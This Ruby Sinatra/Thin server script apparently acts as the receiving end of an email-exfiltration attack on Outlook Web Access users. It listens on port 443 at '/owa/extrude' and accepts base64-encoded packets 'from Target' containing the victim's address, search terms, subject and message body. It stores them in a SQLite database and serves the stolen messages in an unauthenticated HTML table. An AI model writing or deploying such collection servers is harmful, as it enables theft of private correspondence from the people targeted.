require 'sinatra'
require 'thin'
require 'base64'
require 'json'
require 'colorize'
require 'data_mapper'
require 'dm-migrations'
require 'dm-timestamps'

class ExtrudedData
    include DataMapper::Resource

    property :id,           Serial
    property :time,         DateTime
    property :email,        String
    property :search,       String
    property :subject,      String
    property :content,      Text

end

DataMapper.setup(:default, "sqlite://#{File.expand_path('..', __FILE__)}/extruded_data.db")
DataMapper.auto_upgrade!

class Extruder < ::Thin::Backends::TcpServer
  def initialize(host, port, options)
    super(host, port)
    @ssl = true
    @ssl_options = options
  end
end

configure do
  set :environment, :production
  set :bind, '0.0.0.0'
  set :port, 443
  set :server, 'thin'
  class << settings
    # NOTE. sometimes bundle CA certs are needed, since Thin doesn't support specifying it, you can just cat the bundle after the cert
    # cat example.crt godaddy-bundle.crt > new-example-with-bundle.crt
    def server_settings
      {
          :backend          => Extruder,
          :private_key_file => "#{File.dirname(__FILE__)}/your_domain.key",
          :cert_chain_file  => "#{File.dirname(__FILE__)}/your_domain.crt",
          :verify_peer      => false
      }
    end
  end
end

get '/owa/extrude' do
  # TODO improve the data grid table. ideally use jquery dataGrid or bootstrap.
  response = "<table style='width:100%' border='1'><tr><th>Email</th><th>Search</th><th>Subject</th><th>Content</th></tr>"
  emails = ExtrudedData.find_all
  puts "Found #{emails.size} emails."
  emails.each do |mail|
    resp = <<EOF
<tr>
    <td>#{mail.email}</td>
    <td>#{mail.search}</td>
    <td>#{mail.subject}</td>
    <td><iframe width="700" height="300" src="data:text/html;base64,#{Base64.encode64(mail.content)}"></iframe></td>

  </tr>
EOF
    response += resp
  end
  response += "</table>"
  response
end

post '/owa/extrude' do
  begin
    data = JSON.parse(Base64.decode64(params[:data]))
    puts "------------> Got Extruded Packet from Target #{data['target']}  <------------".colorize(:red)
    puts "Search Criteria: ".colorize(:green) + data['search']
    puts "Subject: ".colorize(:blue) + data['subject']
    content =  Base64.decode64(data['body'])
    #puts "Content: ".colorize(:blue) + content

    # store the data in the database
    ExtrudedData.create(
       :email => data['target'],
       :search => data['search'],
       :subject => data['subject'],
       :content => content
    )
  rescue Exception => e
    puts "ERROR: #{e}"
  end
  {}
end

